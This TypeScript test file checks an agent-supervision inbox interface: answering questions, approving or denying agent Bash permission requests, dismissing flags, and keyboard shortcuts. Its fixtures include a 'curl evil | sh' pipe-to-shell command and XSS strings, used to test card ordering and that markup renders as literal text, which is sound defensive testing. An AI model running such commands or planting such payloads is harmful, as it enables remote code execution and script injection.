import { mintId, type InboxItemDto } from '@10db/contracts';
import { fireEvent, screen, waitFor, within } from '@testing-library/react';
import { http, HttpResponse, type RequestHandler, type WebSocketHandler } from 'msw';
import { describe, expect, it } from 'vitest';
import { queryKeys } from '../../daemon/queries';
import { baseHandlers, daemonUrl, eventStream, renderApp, server } from '../../test/daemon';
import { inboxItemDto } from '../../test/fixtures';

function serve(...overrides: (RequestHandler | WebSocketHandler)[]): void {
  server.use(
    ...baseHandlers(),
    eventStream.addEventListener('connection', () => undefined),
  );
  server.use(...overrides);
}

/** Serves `items` as the open inbox and records every answer posted. */
function inbox(items: InboxItemDto[]): { answers: { id: string; body: unknown }[] } {
  const answers: { id: string; body: unknown }[] = [];
  serve(
    http.get(daemonUrl('/inbox'), () =>
      HttpResponse.json(items.filter((item) => !answers.some((a) => a.id === item.id))),
    ),
    http.post(daemonUrl('/inbox/:id/answer'), async ({ params, request }) => {
      const id = String(params['id']);
      answers.push({ id, body: await request.json() });
      const item = items.find((i) => i.id === id);
      return HttpResponse.json({ ...item, state: 'ANSWERED' });
    }),
  );
  return { answers };
}

const key = (k: string, init: { shiftKey?: boolean } = {}): void => {
  fireEvent.keyDown(document.body, { key: k, ...init });
};

/** The expanded card. */
function selectedCard(): HTMLElement {
  const card = document.querySelector('[data-inbox-selected]');
  if (!(card instanceof HTMLElement)) throw new Error('no card is expanded');
  return card;
}

const project = mintId('Project');
const flag = (title: string, body: string): InboxItemDto =>
  inboxItemDto({ kind: 'flag', title, body, options: [], projectId: project });

const color = inboxItemDto({
  kind: 'question',
  title: 'Which badge color?',
  body: 'Color',
  options: [
    { label: 'Teal', description: 'Matches the theme' },
    { label: 'Red', description: 'Stands out' },
  ],
});
const corners = inboxItemDto({
  kind: 'question',
  title: 'Round or square corners?',
  body: '',
  options: [
    { label: 'Round', description: '' },
    { label: 'Square', description: '' },
  ],
});

describe('InboxView', () => {
  it('says so when the inbox is empty', async () => {
    inbox([]);
    renderApp('/inbox');
    expect(await screen.findByText('Nothing needs you right now.')).toBeTruthy();
  });

  it('moves with j/k, chooses with a digit and sends with Enter', async () => {
    const { answers } = inbox([color, corners]);
    renderApp('/inbox');
    expect(await screen.findByText('Which badge color?')).toBeTruthy();

    key('j');
    expect(await screen.findByRole('radio', { name: /Square/ })).toBeTruthy();
    key('k');
    const red = await screen.findByRole('radio', { name: /Red/ });
    key('2');
    await waitFor(() => {
      expect(red.getAttribute('aria-checked')).toBe('true');
    });
    key('Enter');

    await waitFor(() => {
      expect(answers).toEqual([{ id: color.id, body: { choice: 'Red' } }]);
    });
    expect(await screen.findByRole('radio', { name: /Square/ })).toBeTruthy();
  });

  it('focuses the note with n and sends it with ⌘Enter', async () => {
    const { answers } = inbox([color]);
    renderApp('/inbox');
    await screen.findByText('Which badge color?');

    key('1');
    key('n');
    const note = screen.getByLabelText('Note for the agent (optional)');
    await waitFor(() => {
      expect(document.activeElement).toBe(note);
    });
    if (!(note instanceof HTMLTextAreaElement)) throw new Error('the note is not a textarea');
    expect(note.value).toBe('');
    fireEvent.change(note, { target: { value: 'Teal matches the logo' } });
    fireEvent.keyDown(note, { key: 'Enter', metaKey: true });

    await waitFor(() => {
      expect(answers).toEqual([
        { id: color.id, body: { choice: 'Teal', note: 'Teal matches the logo' } },
      ]);
    });
  });

  it('asks for a choice before sending', async () => {
    const { answers } = inbox([color]);
    renderApp('/inbox');
    await screen.findByText('Which badge color?');
    key('Enter');
    expect(await screen.findByText('Choose an option first (1–4).')).toBeTruthy();
    expect(answers).toEqual([]);
  });

  it('shows the four permission choices in words and sends the chosen value', async () => {
    const permission = inboxItemDto({
      kind: 'permission',
      title: 'Allow Bash?',
      body: 'curl -s https://example.com',
      category: 'environment',
      options: [
        { label: 'allow_once', description: 'Allow this call once' },
        { label: 'allow_workstream', description: 'Allow for the rest of this workstream' },
        {
          label: 'allow_project',
          description: 'Always allow in this project (records a decision)',
        },
        { label: 'deny', description: 'Deny; your note is passed to the agent' },
      ],
    });
    const { answers } = inbox([permission]);
    renderApp('/inbox');

    expect(await screen.findByText('curl -s https://example.com')).toBeTruthy();
    for (const name of [
      'Allow once',
      'Allow for this workstream',
      'Always allow in this project',
      'Deny',
    ]) {
      expect(screen.getByRole('radio', { name: new RegExp(`^\\d?\\s*${name}`) })).toBeTruthy();
    }
    expect(screen.getByText('Always allow in this project (records a decision)')).toBeTruthy();
    expect(screen.queryByText('allow_workstream')).toBeNull();

    fireEvent.click(screen.getByRole('radio', { name: /Allow for this workstream/ }));
    fireEvent.click(screen.getByRole('button', { name: 'Send answer' }));
    await waitFor(() => {
      expect(answers).toEqual([{ id: permission.id, body: { choice: 'allow_workstream' } }]);
    });
  });

  it('renders markup in a card as literal text', async () => {
    const hostile = inboxItemDto({
      kind: 'question',
      title: '<b>Bold</b> question',
      body: '<img src=x onerror=alert(1)>',
      options: [
        { label: '<script>x</script>', description: '<i>desc</i>' },
        { label: 'Plain', description: '' },
      ],
    });
    inbox([hostile]);
    renderApp('/inbox');

    expect(await screen.findByText('<img src=x onerror=alert(1)>')).toBeTruthy();
    expect(screen.getByText('<b>Bold</b> question')).toBeTruthy();
    expect(screen.getByText('<script>x</script>')).toBeTruthy();
    expect(screen.getByText('<i>desc</i>')).toBeTruthy();
    expect(document.body.querySelector('img')).toBeNull();
    expect(document.body.querySelector('main b, main i, main script')).toBeNull();
  });

  it('dismisses a flag card, which has no options', async () => {
    const flag = inboxItemDto({
      kind: 'flag',
      title: 'Write outside every claim',
      body: 'docs/notes.md',
      options: [],
    });
    const { answers } = inbox([flag]);
    renderApp('/inbox');

    fireEvent.click(await screen.findByRole('button', { name: 'Dismiss' }));
    await waitFor(() => {
      expect(answers).toEqual([{ id: flag.id, body: { choice: 'dismissed' } }]);
    });
  });

  it('explains a card answered elsewhere and refreshes the list', async () => {
    let gets = 0;
    serve(
      http.get(daemonUrl('/inbox'), () => {
        gets += 1;
        return HttpResponse.json([color]);
      }),
      http.post(daemonUrl('/inbox/:id/answer'), () =>
        HttpResponse.json(
          { error: 'conflict', message: `Inbox item ${color.id} is already ANSWERED` },
          { status: 409 },
        ),
      ),
    );
    renderApp('/inbox');
    await screen.findByText('Which badge color?');
    const getsBefore = gets;

    key('1');
    key('Enter');
    expect(await screen.findByText('This card was already answered.')).toBeTruthy();
    await waitFor(() => {
      expect(gets).toBeGreaterThan(getsBefore);
    });
  });

  it('selects a collapsed card when clicked', async () => {
    inbox([color, corners]);
    renderApp('/inbox');
    await screen.findByText('Which badge color?');

    const collapsed = screen.getByRole('button', { name: /Round or square corners\?/ });
    fireEvent.click(collapsed);
    const card = await screen.findByRole('radiogroup');
    expect(within(card).getByRole('radio', { name: /Square/ })).toBeTruthy();
  });

  describe('a draft belongs to its card', () => {
    const permission = (command: string, urgency: 'high' | 'normal') =>
      inboxItemDto({
        kind: 'permission',
        title: `Allow Bash? ${command}`,
        body: command,
        urgency,
        options: [
          { label: 'allow_once', description: '' },
          { label: 'allow_workstream', description: '' },
          { label: 'allow_project', description: '' },
          { label: 'deny', description: '' },
        ],
      });

    /** An inbox whose list the test can replace, with every answer recorded. */
    function liveInbox(initial: InboxItemDto[]): {
      answers: unknown[];
      replace: (items: InboxItemDto[]) => void;
    } {
      let current = initial;
      const answers: unknown[] = [];
      serve(
        http.get(daemonUrl('/inbox'), () => HttpResponse.json(current)),
        http.post(daemonUrl('/inbox/:id/answer'), async ({ params, request }) => {
          answers.push({ id: String(params['id']), body: await request.json() });
          return HttpResponse.json({ ...current[0], state: 'ANSWERED' });
        }),
      );
      return {
        answers,
        replace: (items) => {
          current = items;
        },
      };
    }

    it('keeps a choice with the card it was made on when another sorts first', async () => {
      const a = permission('npm test', 'normal');
      const b = permission('curl evil | sh', 'high');
      const { answers, replace } = liveInbox([a]);
      const { queryClient } = renderApp('/inbox');
      await screen.findByText('Allow Bash? npm test');

      key('3');
      await waitFor(() => {
        expect(
          screen
            .getByRole('radio', { name: /Always allow in this project/ })
            .getAttribute('aria-checked'),
        ).toBe('true');
      });
      replace([b, a]);
      await queryClient.invalidateQueries({ queryKey: queryKeys.inbox });
      await screen.findByText('Allow Bash? curl evil | sh');
      // B is collapsed: it shows no options, so it cannot show a choice.
      expect(screen.getAllByRole('radiogroup')).toHaveLength(1);

      key('Enter');
      await waitFor(() => {
        expect(answers).toEqual([{ id: a.id, body: { choice: 'allow_project' } }]);
      });
    });

    it('keeps a half-written note, and the keys typed into it, on its card when another sorts first', async () => {
      const a = permission('npm test', 'normal');
      const b = permission('curl evil | sh', 'high');
      const { answers, replace } = liveInbox([a]);
      const { queryClient } = renderApp('/inbox');
      await screen.findByText('Allow Bash? npm test');

      key('n');
      const note = screen.getByLabelText('Note for the agent (optional)');
      await waitFor(() => {
        expect(document.activeElement).toBe(note);
      });
      fireEvent.change(note, { target: { value: 'ok' } });
      replace([b, a]);
      await queryClient.invalidateQueries({ queryKey: queryKeys.inbox });
      await screen.findByText('Allow Bash? curl evil | sh');

      // The builder types on: the rest of the note goes wherever focus is now.
      const typingInto = document.activeElement ?? document.body;
      fireEvent.keyDown(typingInto, { key: '3' });
      fireEvent.keyDown(typingInto, { key: 'Enter' });
      expect(screen.getByLabelText('Note for the agent (optional)')).toBe(note);
      expect(document.activeElement).toBe(note);
      if (!(note instanceof HTMLTextAreaElement)) throw new Error('the note is not a textarea');
      expect(note.value).toBe('ok');

      fireEvent.click(screen.getByRole('radio', { name: /Allow once/ }));
      fireEvent.keyDown(note, { key: 'Enter', metaKey: true });
      await waitFor(() => {
        expect(answers).toEqual([{ id: a.id, body: { choice: 'allow_once', note: 'ok' } }]);
      });
    });

    it('gives Enter to the card shown after an answer, not to one that arrives later', async () => {
      const a = permission('npm test', 'normal');
      const shown = inboxItemDto({
        kind: 'flag',
        title: 'Write outside every claim',
        body: 'docs/shown.md',
        options: [],
      });
      const late = inboxItemDto({
        kind: 'flag',
        title: 'Write inside another workstream claim',
        body: 'src/ui/late.tsx',
        urgency: 'high',
        options: [],
      });
      let current = [a, shown];
      const answers: { id: string; body: unknown }[] = [];
      serve(
        http.get(daemonUrl('/inbox'), () =>
          HttpResponse.json(current.filter((i) => !answers.some((x) => x.id === i.id))),
        ),
        http.post(daemonUrl('/inbox/:id/answer'), async ({ params, request }) => {
          const id = String(params['id']);
          answers.push({ id, body: await request.json() });
          return HttpResponse.json({ ...current.find((i) => i.id === id), state: 'ANSWERED' });
        }),
      );
      const { queryClient } = renderApp('/inbox');
      await screen.findByText('Allow Bash? npm test');

      key('1');
      key('Enter');
      await waitFor(() => {
        expect(selectedCard().textContent).toContain('docs/shown.md');
      });
      current = [late, shown];
      await queryClient.invalidateQueries({ queryKey: queryKeys.inbox });
      await screen.findByText('Write inside another workstream claim');
      expect(selectedCard().textContent).toContain('docs/shown.md');

      key('Enter');
      await waitFor(() => {
        expect(answers.map((x) => x.id)).toEqual([a.id, shown.id]);
      });
    });

    it('keeps a card error off the next card', async () => {
      const a = permission('npm test', 'normal');
      const b = permission('ls', 'normal');
      let items = [a, b];
      serve(
        http.get(daemonUrl('/inbox'), () => HttpResponse.json(items)),
        http.post(daemonUrl('/inbox/:id/answer'), () => {
          items = [b];
          return HttpResponse.json(
            { error: 'conflict', message: 'already ANSWERED' },
            { status: 409 },
          );
        }),
      );
      renderApp('/inbox');
      await screen.findByText('Allow Bash? npm test');
      key('1');
      key('Enter');
      await waitFor(() => {
        expect(screen.queryByText('Allow Bash? npm test')).toBeNull();
      });
      expect(await screen.findByText('Allow Bash? ls')).toBeTruthy();
      expect(screen.queryByText('This card was already answered.')).toBeNull();
    });

    it('does not send a choice that is not one of the card options', async () => {
      const { answers } = inbox([color]);
      renderApp('/inbox');
      await screen.findByText('Which badge color?');
      key('4');
      key('Enter');
      expect(await screen.findByText('Choose an option first (1–4).')).toBeTruthy();
      expect(answers).toEqual([]);
    });
  });

  describe('keys outside the selected card', () => {
    it('leaves Enter on a focused collapsed card to select it', async () => {
      const { answers } = inbox([color, corners]);
      renderApp('/inbox');
      await screen.findByText('Which badge color?');
      const collapsed = screen.getByRole('button', { name: /Round or square corners\?/ });
      collapsed.focus();
      expect(fireEvent.keyDown(collapsed, { key: 'Enter' })).toBe(true);
      expect(answers).toEqual([]);
    });

    it('leaves Enter on a navigation link alone', async () => {
      const { answers } = inbox([color]);
      renderApp('/inbox');
      await screen.findByText('Which badge color?');
      const link = screen.getByRole('link', { name: /Board/ });
      link.focus();
      expect(fireEvent.keyDown(link, { key: 'Enter' })).toBe(true);
      expect(answers).toEqual([]);
    });
  });

  describe('shortcuts', () => {
    it('moves with ↑ and ↓ as well as j and k', async () => {
      inbox([color, corners]);
      renderApp('/inbox');
      await screen.findByText('Which badge color?');
      key('ArrowDown');
      expect(await screen.findByRole('radio', { name: /Square/ })).toBeTruthy();
      key('ArrowUp');
      expect(await screen.findByRole('radio', { name: /Red/ })).toBeTruthy();
      key('j');
      expect(await screen.findByRole('radio', { name: /Square/ })).toBeTruthy();
    });

    it('leaves ↑ and ↓ to a focused option, which moves between options', async () => {
      inbox([color, corners]);
      renderApp('/inbox');
      const teal = await screen.findByRole('radio', { name: /Teal/ });
      teal.focus();
      fireEvent.keyDown(teal, { key: 'ArrowDown', code: 'ArrowDown' });
      await waitFor(() => {
        expect(document.activeElement).toBe(screen.getByRole('radio', { name: /Red/ }));
      });
      expect(selectedCard().textContent).toContain('Which badge color?');
    });

    it('leaves ↑ and ↓ to the page when there is no card to move to', async () => {
      inbox([color, corners]);
      renderApp('/inbox');
      await screen.findByText('Which badge color?');
      // fireEvent answers false when the default action was cancelled.
      expect(fireEvent.keyDown(document.body, { key: 'ArrowUp' })).toBe(true);
      expect(fireEvent.keyDown(document.body, { key: 'ArrowDown' })).toBe(false);
      expect(await screen.findByRole('radio', { name: /Square/ })).toBeTruthy();
      expect(fireEvent.keyDown(document.body, { key: 'ArrowDown' })).toBe(true);
    });

    it('shows no line of shortcut instructions', async () => {
      inbox([color]);
      renderApp('/inbox');
      await screen.findByText('Which badge color?');
      expect(screen.queryByText(/to move/)).toBeNull();
    });

    it('shows Enter on Send Answer and each option its number key', async () => {
      inbox([color]);
      renderApp('/inbox');
      const send = await screen.findByRole('button', { name: /Send answer/ });
      expect(within(send).getByText('↵')).toBeTruthy();
      expect(within(screen.getByRole('radio', { name: /Teal/ })).getByText('1')).toBeTruthy();
      expect(within(screen.getByRole('radio', { name: /Red/ })).getByText('2')).toBeTruthy();
    });

    it('lists every shortcut from the ? button and the ? key', async () => {
      inbox([color]);
      renderApp('/inbox');
      await screen.findByText('Which badge color?');

      const help = screen.getByRole('button', { name: 'Keyboard shortcuts' });
      help.focus();
      fireEvent.click(help);
      const list = await screen.findByRole('dialog', { name: 'Keyboard Shortcuts' });
      for (const action of [
        'Move between cards',
        'Choose an option',
        'Write a note',
        'Send the answer, or dismiss a flag',
        'Send from the note',
        'Show these shortcuts',
      ])
        expect(within(list).getByText(action)).toBeTruthy();
      fireEvent.click(within(list).getByRole('button', { name: 'Close' }));
      await waitFor(() => {
        expect(screen.queryByRole('dialog')).toBeNull();
      });
      // Focus doesn't go back to the ? button, where the Inbox keys would not count.
      expect(document.activeElement).not.toBe(help);

      key('?', { shiftKey: true });
      expect(await screen.findByRole('dialog', { name: 'Keyboard Shortcuts' })).toBeTruthy();
    });
  });

  describe('flags', () => {
    it('shows what a collapsed flag is about', async () => {
      inbox([color, flag('Write outside every claim', 'docs/notes.md (main checkout)')]);
      renderApp('/inbox');
      await screen.findByText('Which badge color?');
      const row = screen.getByRole('button', { name: /Write outside every claim/ });
      expect(row.textContent).toContain('docs/notes.md (main checkout)');
    });

    it('dismisses a collapsed flag from its row without opening it', async () => {
      const stray = flag('Write outside every claim', 'docs/notes.md');
      const { answers } = inbox([color, stray]);
      renderApp('/inbox');
      await screen.findByText('Which badge color?');
      fireEvent.click(screen.getByRole('button', { name: 'Dismiss' }));
      await waitFor(() => {
        expect(answers).toEqual([{ id: stray.id, body: { choice: 'dismissed' } }]);
      });
      expect(selectedCard().textContent).toContain('Which badge color?');
    });

    it('groups identical flags into one row with a count, and dismisses them together', async () => {
      const copies = [1, 2, 3].map(() => flag('MCP server failed', 'mantine exited'));
      const { answers } = inbox([color, ...copies]);
      renderApp('/inbox');
      await screen.findByText('Which badge color?');
      const rows = screen.getAllByRole('button', { name: /MCP server failed/ });
      expect(rows).toHaveLength(1);
      expect(rows[0]?.textContent).toContain('×3');

      key('j');
      expect(selectedCard().textContent).toContain('MCP server failed');
      fireEvent.click(within(selectedCard()).getByRole('button', { name: /Dismiss All/ }));
      await waitFor(() => {
        expect(answers).toEqual(copies.map((c) => ({ id: c.id, body: { choice: 'dismissed' } })));
      });
    });

    it('says in words how many identical cards a folded row holds', async () => {
      const copies = [1, 2].map(() => flag('Batch not started', 'no lane free'));
      inbox([color, ...copies]);
      renderApp('/inbox');
      await screen.findByText('Batch not started');
      expect(screen.getByText('2 identical flags')).toBeTruthy();
      expect(screen.getByRole('button', { name: 'Dismiss All' })).toBeTruthy();
      key('j');
      expect(within(selectedCard()).getByText(/2 identical flags are open/)).toBeTruthy();
    });

    it("never squeezes a row's kind and repeat badges, whatever the title", async () => {
      const title = 'Batch not started because the project has no free lane left right now '.repeat(
        4,
      );
      const copies = [1, 2].map(() => flag(title, 'no lane free'));
      inbox([color, ...copies]);
      renderApp('/inbox');
      await screen.findByText('Which badge color?');
      for (const text of ['Flag', '×2']) {
        const badge = screen.getByText(text).closest('.mantine-Badge-root');
        expect(badge?.getAttribute('style')).toContain('flex-shrink: 0');
      }
      key('j');
      for (const text of ['Flag', '×2']) {
        const badge = within(selectedCard()).getByText(text).closest('.mantine-Badge-root');
        expect(badge?.getAttribute('style')).toContain('flex-shrink: 0');
      }
    });

    it('does not paint a flag red like an error', async () => {
      inbox([flag('Write outside every claim', 'docs/notes.md')]);
      renderApp('/inbox');
      await screen.findByText('Write outside every claim');
      const badge = within(selectedCard()).getByText('Flag').closest('.mantine-Badge-root');
      expect(badge?.getAttribute('style')).toContain('yellow');
    });

    it("keeps the open card's draft when a collapsed flag fails to dismiss, and says so beside it", async () => {
      const stray = flag('Write outside every claim', 'docs/notes.md');
      serve(
        http.get(daemonUrl('/inbox'), () => HttpResponse.json([color, stray])),
        http.post(daemonUrl('/inbox/:id/answer'), () =>
          HttpResponse.json({ error: 'internal', message: 'The daemon broke' }, { status: 500 }),
        ),
      );
      renderApp('/inbox');
      await screen.findByText('Which badge color?');
      key('2');
      const note = screen.getByLabelText('Note for the agent (optional)');
      fireEvent.change(note, { target: { value: 'half written' } });

      const row = screen.getByRole('button', { name: /Write outside every claim/ }).parentElement;
      if (!row) throw new Error('the flag row has no container');
      fireEvent.click(within(row).getByRole('button', { name: 'Dismiss' }));

      expect(await within(row).findByText('The daemon broke')).toBeTruthy();
      expect(screen.getByRole('radio', { name: /Red/ }).getAttribute('aria-checked')).toBe('true');
      expect(
        screen.getByLabelText<HTMLTextAreaElement>('Note for the agent (optional)').value,
      ).toBe('half written');
    });

    it('keeps a group selected while its flags are dismissed, and shows a failure on it', async () => {
      const copies = [1, 2, 3].map(() => flag('MCP server failed', 'mantine exited'));
      const answered: string[] = [];
      serve(
        http.get(daemonUrl('/inbox'), () =>
          HttpResponse.json([color, ...copies].filter((i) => !answered.includes(i.id))),
        ),
        http.post(daemonUrl('/inbox/:id/answer'), ({ params }) => {
          const id = String(params['id']);
          if (id === copies[1]?.id)
            return HttpResponse.json(
              { error: 'internal', message: 'The daemon broke' },
              { status: 500 },
            );
          answered.push(id);
          return HttpResponse.json({ ...copies.find((c) => c.id === id), state: 'RESOLVED' });
        }),
      );
      renderApp('/inbox');
      await screen.findByText('Which badge color?');
      key('j');
      expect(selectedCard().textContent).toContain('MCP server failed');
      key('Enter');

      expect(await within(selectedCard()).findByText('The daemon broke')).toBeTruthy();
      expect(selectedCard().textContent).toContain('×2');
      expect(answered).toEqual([copies[0]?.id]);
    });

    it('refreshes the list when a flag was already closed elsewhere', async () => {
      const stray = flag('Write outside every claim', 'docs/notes.md');
      let closed = false;
      serve(
        http.get(daemonUrl('/inbox'), () => HttpResponse.json(closed ? [] : [stray])),
        http.post(daemonUrl('/inbox/:id/answer'), () => {
          closed = true;
          return HttpResponse.json(
            { error: 'conflict', message: `Inbox item ${stray.id} is already RESOLVED` },
            { status: 409 },
          );
        }),
      );
      renderApp('/inbox');
      await screen.findByText('Write outside every claim');
      fireEvent.click(screen.getByRole('button', { name: 'Dismiss' }));
      expect(await screen.findByText('Nothing needs you right now.')).toBeTruthy();
    });
  });
});

describe('the resolved view', () => {
  const closedBy10db = inboxItemDto({
    kind: 'flag',
    state: 'RESOLVED',
    title: 'Batch not started: 10db will not run git in /repo',
    body: 'Nothing was pushed.',
    options: [],
    detail: { resolution: { by: '10db', reason: 'Alpha started' } },
    updatedAt: '2026-10-30T10:00:00.000Z',
  });
  const answered = inboxItemDto({
    kind: 'question',
    state: 'RESOLVED',
    title: 'Which badge color?',
    answer: { choice: 'Teal' },
    updatedAt: '2026-10-30T11:00:00.000Z',
  });

  function serveBoth(open: InboxItemDto[], resolved: InboxItemDto[]): void {
    serve(
      http.get(daemonUrl('/inbox'), ({ request }) =>
        HttpResponse.json(
          new URL(request.url).searchParams.get('state') === 'RESOLVED' ? resolved : open,
        ),
      ),
    );
  }

  it('lists resolved cards, newest first, saying who closed each and why', async () => {
    serveBoth([color], [closedBy10db, answered]);
    renderApp('/inbox');
    await screen.findByText('Which badge color?');
    fireEvent.click(screen.getByRole('tab', { name: 'Resolved' }));

    const rows = await screen.findAllByTestId('resolved-card');
    expect(rows.map((row) => row.textContent)).toEqual([
      expect.stringContaining('Which badge color?'),
      expect.stringContaining('Batch not started: 10db will not run git in /repo'),
    ]);
    expect(rows[0]?.textContent).toContain('Answered: Teal');
    expect(rows[1]?.textContent).toContain('Resolved by 10db: Alpha started');
    // The open cards and their keys are not there.
    expect(screen.queryByRole('button', { name: 'Send Answer' })).toBeNull();
  });

  it('says so when nothing has been resolved', async () => {
    serveBoth([color], []);
    renderApp('/inbox');
    await screen.findByText('Which badge color?');
    fireEvent.click(screen.getByRole('tab', { name: 'Resolved' }));
    expect(await screen.findByText('Nothing has been resolved yet.')).toBeTruthy();
  });
});
